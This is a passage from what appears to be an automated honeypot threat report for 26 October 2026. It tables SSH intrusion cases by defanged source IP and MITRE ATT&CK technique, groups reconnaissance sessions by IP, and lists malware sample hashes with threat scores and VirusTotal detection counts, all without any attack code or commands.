| IR-5fd67eb62259 | HIGH | `45.249.245[.]91` | 2026-10-26 04:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6d0ce6d18d97 | HIGH | `45.249.245[.]91` | 2026-10-26 04:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-756b418f5dc6 | HIGH | `80.94.95[.]118` | 2026-10-26 04:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ec84ed4a6461 | HIGH | `195.178.110[.]217` | 2026-10-26 04:02 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-c4ebcf1f408c | HIGH | `35.210.61[.]208` | 2026-10-26 04:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1c9f59cf053c | HIGH | `35.210.61[.]208` | 2026-10-26 04:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-aa73de24f9c6 | HIGH | `195.178.110[.]217` | 2026-10-26 04:04 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-a1fd40b254c6 | HIGH | `103.218.242[.]36` | 2026-10-26 04:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f8a67112eed1 | HIGH | `103.218.242[.]36` | 2026-10-26 04:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e34206f27353 | HIGH | `195.178.110[.]217` | 2026-10-26 04:05 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-80c6a332c2bd | HIGH | `195.178.110[.]217` | 2026-10-26 04:07 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-74884b7ca527 | HIGH | `81.192.46[.]29` | 2026-10-26 04:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-99bdbdd81faf | HIGH | `81.192.46[.]29` | 2026-10-26 04:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c73351461348 | HIGH | `195.178.110[.]217` | 2026-10-26 04:09 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-7ad896c8b9b3 | HIGH | `35.237.94[.]18` | 2026-10-26 04:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2730e6d7f952 | HIGH | `35.237.94[.]18` | 2026-10-26 04:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-543d6974d892 | HIGH | `195.178.110[.]217` | 2026-10-26 04:12 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-f2ff3d7f6f01 | HIGH | `195.178.110[.]217` | 2026-10-26 04:13 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-54b4b827416b | HIGH | `195.178.110[.]217` | 2026-10-26 04:15 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-68626f73bd92 | HIGH | `195.178.110[.]217` | 2026-10-26 04:17 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-6a1e1d66f278 | HIGH | `94.154.43[.]196` | 2026-10-26 04:22 | Y | 4 | 0 | `T1078 · T1083` |
| IR-b6fd48faa937 | HIGH | `78.128.112[.]74` | 2026-10-26 04:56 | Y | 1 | 0 | `T1078 · T1592` |
| IR-935f8e263e91 | HIGH | `34.140.46[.]238` | 2026-10-26 05:21 | Y | 2 | 0 | `T1078` |
| IR-3fd926b64000 | HIGH | `34.140.46[.]238` | 2026-10-26 05:21 | Y | 1 | 0 | `T1078` |
| IR-d56987e0e98c | HIGH | `34.140.46[.]238` | 2026-10-26 05:21 | Y | 0 | 0 | `T1078` |
| IR-accf2af6d9f2 | HIGH | `92.118.39[.]49` | 2026-10-26 05:24 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-d0f0e819d9da | HIGH | `92.118.39[.]49` | 2026-10-26 05:26 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-ec75b170b7a7 | HIGH | `92.118.39[.]49` | 2026-10-26 05:29 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-4f11f5903bc9 | HIGH | `176.53.159[.]196` | 2026-10-26 05:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f51c29859ed6 | HIGH | `92.118.39[.]49` | 2026-10-26 05:31 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-957404e5577d | HIGH | `92.118.39[.]49` | 2026-10-26 05:34 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-6b9533e31419 | HIGH | `115.190.211[.]85` | 2026-10-26 05:35 | Y | 1 | 0 | `T1078 · T1592` |
| IR-07e90b769440 | HIGH | `92.118.39[.]49` | 2026-10-26 05:37 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-c849f000ccd9 | HIGH | `92.118.39[.]49` | 2026-10-26 05:42 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-ccf7d2253fdd | HIGH | `92.118.39[.]49` | 2026-10-26 05:44 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-c3fd535ad78c | HIGH | `92.118.39[.]49` | 2026-10-26 05:47 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
_… 310 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.19.117[.]129` | **3** | 2026-10-26 02:17 | 2026-10-26 06:15 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `139.19.117[.]129` | **3** | 2026-10-26 09:08 | 2026-10-26 12:07 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]130` | **2** | 2026-10-26 03:49 | 2026-10-26 04:03 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]141` | **2** | 2026-10-26 15:57 | 2026-10-26 16:10 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]145` | **2** | 2026-10-26 01:56 | 2026-10-26 02:11 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `137.184.5[.]188` | **2** | 2026-10-26 03:21 | 2026-10-26 04:14 | 1m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **2** | 2026-10-26 12:58 | 2026-10-26 14:01 | 1m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-26 01:14 | 2026-10-26 02:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-26 04:16 | 2026-10-26 06:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-26 08:17 | 2026-10-26 10:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-26 12:15 | 2026-10-26 14:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | **2** | 2026-10-26 01:23 | 2026-10-26 03:15 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]217` | **2** | 2026-10-26 03:58 | 2026-10-26 04:10 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]218` | **2** | 2026-10-26 11:20 | 2026-10-26 12:02 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.195[.]69` | **2** | 2026-10-26 05:55 | 2026-10-26 06:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]155` | **2** | 2026-10-26 01:49 | 2026-10-26 02:08 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.132.85[.]130` | 1 | 2026-10-26 01:32 | 2026-10-26 01:32 | 4s | 0 | `T1592` | 🟢 LOW |
| `101.89.76[.]249` | 1 | 2026-10-26 07:58 | 2026-10-26 08:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `102.212.40[.]231` | 1 | 2026-10-26 10:10 | 2026-10-26 10:10 | 13s | 0 | `T1592` | 🟢 LOW |
| `103.233.66[.]145` | 1 | 2026-10-26 06:06 | 2026-10-26 06:06 | 13s | 0 | `T1592` | 🟢 LOW |
| `103.76.102[.]113` | 1 | 2026-10-26 08:25 | 2026-10-26 08:25 | 12s | 0 | `T1592` | 🟢 LOW |
| `104.168.85[.]59` | 1 | 2026-10-26 11:10 | 2026-10-26 11:10 | 30s | 0 | `T1592` | 🟢 LOW |
| `105.184.145[.]82` | 1 | 2026-10-26 05:25 | 2026-10-26 05:25 | 13s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]134` | 1 | 2026-10-26 15:01 | 2026-10-26 15:01 | 8s | 0 | `T1592` | 🟢 LOW |
| `112.46.214[.]58` | 1 | 2026-10-26 02:57 | 2026-10-26 02:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.117.150[.]63` | 1 | 2026-10-26 01:51 | 2026-10-26 01:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.181[.]18` | 1 | 2026-10-26 16:17 | 2026-10-26 16:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.211[.]85` | 1 | 2026-10-26 05:35 | 2026-10-26 05:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.190.215[.]101` | 1 | 2026-10-26 02:00 | 2026-10-26 02:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.228.233[.]93` | 1 | 2026-10-26 11:31 | 2026-10-26 11:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.239[.]187` | 1 | 2026-10-26 01:57 | 2026-10-26 01:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.240[.]6` | 1 | 2026-10-26 13:04 | 2026-10-26 13:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `118.196.8[.]203` | 1 | 2026-10-26 02:33 | 2026-10-26 02:34 | 39s | 0 | `T1592` | 🟢 LOW |
| `120.147.3[.]39` | 1 | 2026-10-26 08:42 | 2026-10-26 08:43 | 13s | 0 | `T1592` | 🟢 LOW |
| `120.147.3[.]39` | 1 | 2026-10-26 14:06 | 2026-10-26 14:06 | 13s | 0 | `T1592` | 🟢 LOW |
| `120.48.124[.]81` | 1 | 2026-10-26 16:29 | 2026-10-26 16:31 | 121s | 0 | `T1592` | 🟢 LOW |
| `121.153.183[.]194` | 1 | 2026-10-26 02:01 | 2026-10-26 02:01 | 13s | 0 | `T1592` | 🟢 LOW |
| `121.185.131[.]33` | 1 | 2026-10-26 01:24 | 2026-10-26 01:24 | 15s | 0 | `T1592` | 🟢 LOW |
| `125.124.42[.]183` | 1 | 2026-10-26 16:38 | 2026-10-26 16:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.91.35[.]169` | 1 | 2026-10-26 06:22 | 2026-10-26 06:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-26 01:39 | 2026-10-26 01:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-26 06:18 | 2026-10-26 06:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `132.247.187[.]62` | 1 | 2026-10-26 07:31 | 2026-10-26 07:31 | 13s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-10-26 01:01 | 2026-10-26 01:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-10-26 14:55 | 2026-10-26 14:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-26 06:25 | 2026-10-26 06:25 | 31s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-26 08:54 | 2026-10-26 08:55 | 50s | 0 | `T1592` | 🟢 LOW |
| `138.186.93[.]161` | 1 | 2026-10-26 12:22 | 2026-10-26 12:22 | 13s | 0 | `T1592` | 🟢 LOW |
| `139.196.103[.]75` | 1 | 2026-10-26 10:59 | 2026-10-26 10:59 | 2s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-26 16:23 | 2026-10-26 16:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]229` | 1 | 2026-10-26 09:18 | 2026-10-26 09:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.55.148[.]34` | 1 | 2026-10-26 01:46 | 2026-10-26 01:46 | 25s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-26 13:20 | 2026-10-26 13:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `146.190.102[.]83` | 1 | 2026-10-26 03:46 | 2026-10-26 03:46 | 3s | 0 | `T1592` | 🟢 LOW |
| `148.204.85[.]218` | 1 | 2026-10-26 14:33 | 2026-10-26 14:33 | 11s | 0 | `T1592` | 🟢 LOW |
| `151.243.11[.]169` | 1 | 2026-10-26 14:59 | 2026-10-26 14:59 | 3s | 0 | `T1592` | 🟢 LOW |
| `152.42.223[.]6` | 1 | 2026-10-26 14:40 | 2026-10-26 14:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `167.88.168[.]121` | 1 | 2026-10-26 12:33 | 2026-10-26 12:34 | 59s | 0 | `T1592` | 🟢 LOW |
| `168.181.217[.]179` | 1 | 2026-10-26 09:33 | 2026-10-26 09:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.100.21[.]20` | 1 | 2026-10-26 04:33 | 2026-10-26 04:33 | 13s | 0 | `T1592` | 🟢 LOW |
| `175.202.171[.]88` | 1 | 2026-10-26 09:10 | 2026-10-26 09:11 | 27s | 0 | `T1592` | 🟢 LOW |
| `175.202.194[.]168` | 1 | 2026-10-26 11:53 | 2026-10-26 11:53 | 20s | 0 | `T1592` | 🟢 LOW |
| `176.122.121[.]243` | 1 | 2026-10-26 13:39 | 2026-10-26 13:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `179.61.111[.]246` | 1 | 2026-10-26 14:29 | 2026-10-26 14:29 | 12s | 0 | `T1592` | 🟢 LOW |
| `180.113.57[.]12` | 1 | 2026-10-26 09:19 | 2026-10-26 09:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.184.178[.]165` | 1 | 2026-10-26 13:00 | 2026-10-26 13:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.103[.]111` | 1 | 2026-10-26 16:32 | 2026-10-26 16:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.112[.]121` | 1 | 2026-10-26 14:01 | 2026-10-26 14:02 | 17s | 0 | `T1592` | 🟢 LOW |
| `180.76.233[.]177` | 1 | 2026-10-26 05:55 | 2026-10-26 05:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `181.79.86[.]179` | 1 | 2026-10-26 04:50 | 2026-10-26 04:50 | 13s | 0 | `T1592` | 🟢 LOW |
| `183.36.126[.]68` | 1 | 2026-10-26 06:32 | 2026-10-26 06:34 | 81s | 0 | `T1592` | 🟢 LOW |
| `185.213.174[.]233` | 1 | 2026-10-26 16:25 | 2026-10-26 16:25 | 7s | 0 | `T1592` | 🟢 LOW |
| `185.226.196[.]22` | 1 | 2026-10-26 11:00 | 2026-10-26 11:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]22` | 1 | 2026-10-26 07:46 | 2026-10-26 07:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.22.253[.]213` | 1 | 2026-10-26 07:50 | 2026-10-26 07:50 | 14s | 0 | `T1592` | 🟢 LOW |
| `187.87.47[.]63` | 1 | 2026-10-26 04:03 | 2026-10-26 04:03 | 14s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-26 13:30 | 2026-10-26 13:32 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.10.210[.]210` | 1 | 2026-10-26 12:58 | 2026-10-26 12:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]228` | 1 | 2026-10-26 15:35 | 2026-10-26 15:35 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `199.165.159[.]41` | 1 | 2026-10-26 06:42 | 2026-10-26 06:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-10-26 09:33 | 2026-10-26 09:34 | 12s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-10-26 15:13 | 2026-10-26 15:14 | 12s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-10-26 03:37 | 2026-10-26 03:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.163.12[.]242` | 1 | 2026-10-26 07:07 | 2026-10-26 07:07 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.168.122[.]61` | 1 | 2026-10-26 11:58 | 2026-10-26 11:58 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.29.29[.]221` | 1 | 2026-10-26 07:03 | 2026-10-26 07:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.40.233[.]168` | 1 | 2026-10-26 13:52 | 2026-10-26 13:52 | 10s | 0 | `T1592` | 🟢 LOW |
| `202.46.68[.]96` | 1 | 2026-10-26 15:34 | 2026-10-26 15:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.194.52[.]6` | 1 | 2026-10-26 12:21 | 2026-10-26 12:22 | 15s | 0 | `T1592` | 🟢 LOW |
| `211.194.52[.]6` | 1 | 2026-10-26 14:29 | 2026-10-26 14:29 | 17s | 0 | `T1592` | 🟢 LOW |
| `211.63.225[.]145` | 1 | 2026-10-26 11:19 | 2026-10-26 11:19 | 29s | 0 | `T1592` | 🟢 LOW |
| `213.137.74[.]95` | 1 | 2026-10-26 12:52 | 2026-10-26 12:52 | 14s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]91` | 1 | 2026-10-26 13:10 | 2026-10-26 13:10 | 10s | 0 | `T1592` | 🟢 LOW |
| `213.230.86[.]47` | 1 | 2026-10-26 07:33 | 2026-10-26 07:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `219.78.63[.]156` | 1 | 2026-10-26 05:55 | 2026-10-26 05:56 | 23s | 0 | `T1592` | 🟢 LOW |
| `220.87.110[.]141` | 1 | 2026-10-26 16:32 | 2026-10-26 16:33 | 30s | 0 | `T1592` | 🟢 LOW |
| `223.83.183[.]254` | 1 | 2026-10-26 09:13 | 2026-10-26 09:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `24.144.116[.]101` | 1 | 2026-10-26 09:52 | 2026-10-26 09:53 | 60s | 0 | `T1592` | 🟢 LOW |
| `3.87.196[.]69` | 1 | 2026-10-26 01:34 | 2026-10-26 01:34 | 1s | 0 | `T1592` | 🟢 LOW |
| `31.202.87[.]158` | 1 | 2026-10-26 16:18 | 2026-10-26 16:19 | 27s | 0 | `T1592` | 🟢 LOW |
| `34.140.46[.]238` | 1 | 2026-10-26 05:21 | 2026-10-26 05:21 | 11s | 0 | `T1592` | 🟢 LOW |
| `34.156.168[.]178` | 1 | 2026-10-26 06:57 | 2026-10-26 06:57 | 11s | 0 | `T1592` | 🟢 LOW |
| `34.62.136[.]27` | 1 | 2026-10-26 06:01 | 2026-10-26 06:01 | 9s | 0 | `T1592` | 🟢 LOW |
| `34.77.63[.]60` | 1 | 2026-10-26 06:01 | 2026-10-26 06:01 | 3s | 0 | `T1592` | 🟢 LOW |
| `34.78.118[.]97` | 1 | 2026-10-26 06:02 | 2026-10-26 06:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.105.165[.]232` | 1 | 2026-10-26 11:59 | 2026-10-26 11:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.136.66[.]44` | 1 | 2026-10-26 11:52 | 2026-10-26 11:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.137.180[.]219` | 1 | 2026-10-26 01:08 | 2026-10-26 01:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.212.31[.]122` | 1 | 2026-10-26 09:49 | 2026-10-26 09:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `38.3.218[.]153` | 1 | 2026-10-26 05:59 | 2026-10-26 05:59 | 14s | 0 | `T1592` | 🟢 LOW |
| `42.248.127[.]219` | 1 | 2026-10-26 06:13 | 2026-10-26 06:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `44.220.185[.]233` | 1 | 2026-10-26 12:57 | 2026-10-26 12:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]121` | 1 | 2026-10-26 01:05 | 2026-10-26 01:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-10-26 10:05 | 2026-10-26 10:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-10-26 16:07 | 2026-10-26 16:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-10-26 07:07 | 2026-10-26 07:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-10-26 02:42 | 2026-10-26 02:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-10-26 07:34 | 2026-10-26 07:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.172.18[.]74` | 1 | 2026-10-26 06:04 | 2026-10-26 06:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-10-26 06:40 | 2026-10-26 06:40 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.90.81[.]2` | 1 | 2026-10-26 07:14 | 2026-10-26 07:14 | 13s | 0 | `T1592` | 🟢 LOW |
| `46.36.123[.]131` | 1 | 2026-10-26 01:29 | 2026-10-26 01:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.93.81[.]231` | 1 | 2026-10-26 09:43 | 2026-10-26 09:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.20.236[.]52` | 1 | 2026-10-26 15:35 | 2026-10-26 15:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `59.11.42[.]221` | 1 | 2026-10-26 10:28 | 2026-10-26 10:29 | 30s | 0 | `T1592` | 🟢 LOW |
| `59.28.174[.]77` | 1 | 2026-10-26 06:14 | 2026-10-26 06:14 | 27s | 0 | `T1592` | 🟢 LOW |
| `60.188.249[.]64` | 1 | 2026-10-26 06:52 | 2026-10-26 06:52 | 8s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]132` | 1 | 2026-10-26 04:13 | 2026-10-26 04:13 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]48` | 1 | 2026-10-26 05:21 | 2026-10-26 05:22 | 2s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]172` | 1 | 2026-10-26 06:42 | 2026-10-26 06:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]136` | 1 | 2026-10-26 11:33 | 2026-10-26 11:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]177` | 1 | 2026-10-26 10:43 | 2026-10-26 10:43 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]44` | 1 | 2026-10-26 05:55 | 2026-10-26 05:55 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]192` | 1 | 2026-10-26 05:54 | 2026-10-26 05:54 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]126` | 1 | 2026-10-26 06:50 | 2026-10-26 06:50 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]88` | 1 | 2026-10-26 05:56 | 2026-10-26 05:56 | 18s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]81` | 1 | 2026-10-26 03:44 | 2026-10-26 03:44 | 25s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]157` | 1 | 2026-10-26 10:37 | 2026-10-26 10:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.240.223[.]214` | 1 | 2026-10-26 14:32 | 2026-10-26 14:32 | 10s | 0 | `T1592` | 🟢 LOW |
| `66.240.236[.]116` | 1 | 2026-10-26 04:04 | 2026-10-26 04:04 | 10s | 0 | `T1592` | 🟢 LOW |
| `71.6.142[.]213` | 1 | 2026-10-26 07:40 | 2026-10-26 07:41 | 10s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]23` | 1 | 2026-10-26 13:52 | 2026-10-26 13:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]87` | 1 | 2026-10-26 07:00 | 2026-10-26 07:00 | 10s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]28` | 1 | 2026-10-26 13:54 | 2026-10-26 13:54 | 8s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-10-26 01:01 | 2026-10-26 01:01 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-10-26 04:56 | 2026-10-26 04:56 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-10-26 08:41 | 2026-10-26 08:41 | 6s | 0 | `T1592` | 🟢 LOW |
| `8.130.123[.]176` | 1 | 2026-10-26 08:24 | 2026-10-26 08:24 | 1s | 0 | `T1592` | 🟢 LOW |
| `84.75.213[.]12` | 1 | 2026-10-26 14:15 | 2026-10-26 14:15 | 30s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]0` | 1 | 2026-10-26 07:34 | 2026-10-26 07:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]5` | 1 | 2026-10-26 08:35 | 2026-10-26 08:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.211.133[.]65` | 1 | 2026-10-26 08:09 | 2026-10-26 08:09 | 13s | 0 | `T1592` | 🟢 LOW |
| `91.92.43[.]221` | 1 | 2026-10-26 11:42 | 2026-10-26 11:42 | 1s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]49` | 1 | 2026-10-26 05:39 | 2026-10-26 05:39 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.154.43[.]196` | 1 | 2026-10-26 04:22 | 2026-10-26 04:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `95.188.91[.]101` | 1 | 2026-10-26 12:27 | 2026-10-26 12:29 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
